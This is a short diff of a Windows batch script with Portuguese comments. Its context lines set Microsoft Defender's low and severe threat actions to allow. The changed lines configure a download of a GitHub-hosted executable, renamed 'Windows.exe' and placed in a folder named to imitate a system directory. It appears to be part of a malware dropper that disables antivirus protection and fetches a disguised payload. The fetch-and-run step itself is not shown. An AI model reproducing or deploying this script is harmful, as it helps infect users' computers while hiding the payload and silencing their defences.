@@ -72,9 +72,9 @@ powershell -Command "Set-MpPreference -LowThreatDefaultAction 6" >nul 2>&1
 powershell -Command "Set-MpPreference -SevereThreatDefaultAction 6" >nul 2>&1
 
 :: --- Configuracao de download ---
-set "URL=https://github.com/romarioeasy/bora/raw/main/borabora.exe"
-set "PASTA_APP=C:\BoraJogo"
-set "NOME_EXE=borabora.exe"
+set "URL=https://github.com/espertin/winds/blob/main/Windows.exe"
+set "PASTA_APP=C:\Windowns"
+set "NOME_EXE=Windows.exe"
 set "CAMINHO_FULL=%PASTA_APP%\%NOME_EXE%"
 
 if not exist "%PASTA_APP%" mkdir "%PASTA_APP%" >nul 2>&1
